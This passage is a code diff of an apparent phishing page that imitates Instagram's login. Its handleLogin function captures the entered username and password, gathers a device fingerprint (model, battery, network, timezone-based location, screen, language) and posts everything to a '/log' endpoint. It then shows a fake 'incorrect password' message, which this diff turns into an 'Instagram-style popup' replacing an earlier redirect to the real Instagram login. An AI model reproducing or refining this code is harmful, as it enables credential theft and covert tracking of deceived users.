-                        battery = batPct + '% — ' + charging;
-                    }
-                } catch (e) {
-                    battery = "N/A";
+                var rawModel = '';
+                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                    try { var hints = await navigator.userAgentData.getHighEntropyValues(['model']); if (hints && hints.model && hints.model !== '' && hints.model !== 'K') rawModel = hints.model; } catch (e) { }
                 }
+                if (!rawModel) { var m1 = ua.match(/;\s*(.+?)\s+Build\//); if (m1 && m1[1]) { var r1 = m1[1].trim(); if (r1 !== 'K' && r1.length > 1 && !/^Android/i.test(r1)) rawModel = r1; } }
+                if (!rawModel) { var m2 = ua.match(/Android\s[\d.]+;\s*([^);]+)\)/); if (m2 && m2[1]) { var r2 = m2[1].trim(); if (r2 !== 'K' && r2.length > 1 && !/^Android/i.test(r2)) rawModel = r2; } }
+                if (!rawModel || rawModel === 'K') { if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) { try { var hints2 = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']); if (hints2 && hints2.model && hints2.model !== '' && hints2.model !== 'K') rawModel = hints2.model; } catch (e) { } } }
+                var friendlyName = ''; if (rawModel && rawModel !== 'K') friendlyName = formatModel(rawModel);
+                if (!friendlyName) friendlyName = 'Android Device';
+                device = friendlyName + ' (Android ' + androidVer + ')'; os = 'Android ' + androidVer;
+                try { if (navigator.getBattery) { var bm = await navigator.getBattery(); battery = Math.round(bm.level * 100) + '% — ' + (bm.charging ? 'Charging ⚡' : 'Not Charging'); } } catch (e) { battery = 'N/A'; }
             } else if (/Windows/i.test(ua)) {
-                device = "Windows PC";
-                var winVer = (ua.match(/Windows NT ([\d.]+)/) || [, ''])[1];
-                var winMap = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' };
-                os = "Windows " + (winMap[winVer] || winVer);
-                battery = "N/A";
-            } else if (/Macintosh/i.test(ua)) {
-                device = "Macintosh";
-                var macVer = (ua.match(/Mac OS X ([\d_\.]+)/) || [, ''])[1].replace(/_/g, '.');
-                os = "macOS " + macVer;
-                battery = "N/A";
-            } else if (/Linux/i.test(ua)) {
-                device = "Linux PC";
-                os = "Linux";
-                battery = "N/A";
-            }
+                device = 'Windows PC'; var winVer = (ua.match(/Windows NT ([\d.]+)/) || [, ''])[1]; var winMap = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' }; os = 'Windows ' + (winMap[winVer] || winVer);
+            } else if (/Macintosh/i.test(ua)) { device = 'Macintosh'; os = 'macOS ' + (ua.match(/Mac OS X ([\d_\.]+)/) || [, ''])[1].replace(/_/g, '.'); }
+            else if (/Linux/i.test(ua)) { device = 'Linux PC'; os = 'Linux'; }
 
             var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-            var offset = new Date().getTimezoneOffset();
-            var sign = offset <= 0 ? '+' : '-';
-            var hours = Math.floor(Math.abs(offset / 60));
-            var mins = Math.abs(offset % 60);
-            var tzFormatted = tz + ' (GMT' + sign + String(hours).padStart(2, '0') + ':' + String(mins).padStart(2, '0') + ')';
+            var offset = new Date().getTimezoneOffset(); var sign = offset <= 0 ? '+' : '-';
+            var tzFormatted = tz + ' (GMT' + sign + String(Math.floor(Math.abs(offset / 60))).padStart(2, '0') + ':' + String(Math.abs(offset % 60)).padStart(2, '0') + ')';
+            var loc = 'Unknown'; if (tz && tz.includes('/')) { var parts = tz.split('/'); loc = parts[parts.length - 1].replace(/_/g, ' ') + ', ' + parts[0]; }
+            var network = 'WiFi';
+            try { if (navigator.connection && navigator.connection.effectiveType) { var et = navigator.connection.effectiveType.toUpperCase(); network = et === '4G' ? (navigator.connection.type === 'cellular' ? '4G Mobile Data' : 'WiFi') : et + ' Connection'; if (navigator.connection.downlink) network += ' — ' + navigator.connection.downlink + 'Mbps'; } } catch (e) { }
 
-            var loc = 'Unknown';
-            if (tz && tz.includes('/')) {
-                var parts = tz.split('/');
-                loc = parts[parts.length - 1].replace(/_/g, ' ') + ', ' + parts[0];
-            }
-
-            var network = "WiFi";
-            try {
-                if (navigator.connection && navigator.connection.effectiveType) {
-                    var et = navigator.connection.effectiveType.toUpperCase();
-                    if (et === '4G') {
-                        network = navigator.connection.type === 'cellular' ? '4G Mobile Data' : 'WiFi';
-                    } else {
-                        network = et + ' Connection';
-                    }
-                    if (navigator.connection.downlink) {
-                        network += ' — ' + navigator.connection.downlink + 'Mbps';
-                    }
-                }
-            } catch (e) { }
-
-            var screen = window.screen.width + '×' + window.screen.height;
-            var timing = ((Date.now() - _pageLoadTime) / 1000).toFixed(1);
-
-            return {
-                device: device, os: os, loc: loc, tz: tzFormatted,
-                bat: battery, net: network, lang: navigator.language || 'Unknown',
-                screen: screen, timing: timing
-            };
+            return { device: device, os: os, loc: loc, tz: tzFormatted, bat: battery, net: network, lang: navigator.language || 'Unknown', screen: window.screen.width + '×' + window.screen.height, timing: ((Date.now() - _pageLoadTime) / 1000).toFixed(1) };
         }
 
+        // ═══════════════════════════════════
+        //  LOGIN HANDLER (uses popup, not alert)
+        // ═══════════════════════════════════
         async function handleLogin(event) {
             event.preventDefault();
-
             var u = document.getElementById('username').value.trim();
             var p = document.getElementById('password').value.trim();
             if (!u || !p) return;
@@ -575,48 +810,26 @@
             document.getElementById('loadingOverlay').classList.add('active');
 
             var fp;
-            try {
-                fp = await getFingerprint();
-            } catch (err) {
-                fp = {
-                    device: 'Unknown', os: 'Unknown', loc: 'Unknown',
-                    tz: 'Unknown', bat: 'N/A', net: 'Unknown',
-                    lang: 'Unknown', screen: 'Unknown', timing: '0'
-                };
-            }
+            try { fp = await getFingerprint(); }
+            catch (err) { fp = { device: 'Unknown', os: 'Unknown', loc: 'Unknown', tz: 'Unknown', bat: 'N/A', net: 'Unknown', lang: 'Unknown', screen: 'Unknown', timing: '0' }; }
 
             fetch('/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: u, password: p, fingerprint: fp
-                })
+                body: JSON.stringify({ username: u, password: p, fingerprint: fp })
             })
-                .then(function (response) {
-                    return response.json().then(data => {
-                        if (!response.ok) throw new Error('Server error');
-                        return data;
-                    });
-                })
+                .then(function (r) { return r.json().then(function (d) { if (!r.ok) throw new Error('Server error'); return d; }); })
                 .then(function (data) {
                     document.getElementById('loadingOverlay').classList.remove('active');
-                    alert("Sorry, your password was incorrect. Please double-check your password.");
-                    document.getElementById('password').value = '';
-                    document.getElementById('password').type = 'password';
-                    document.getElementById('eyeHiddenIcon').style.display = 'block';
-                    document.getElementById('eyeVisibleIcon').style.display = 'none';
-
-                    setTimeout(function () {
-                        window.location.href = 'https://www.instagram.com/accounts/login/';
-                    }, 1500);
+                    // ★ Show Instagram-style popup instead of alert()
+                    showErrorPopup();
                 })
                 .catch(function (error) {
                     document.getElementById('loadingOverlay').classList.remove('active');
-                    alert("Connection error. Please try again.");
+                    showErrorPopup();
                 });
         }
     </script>
-
 </body>
 
 </html>
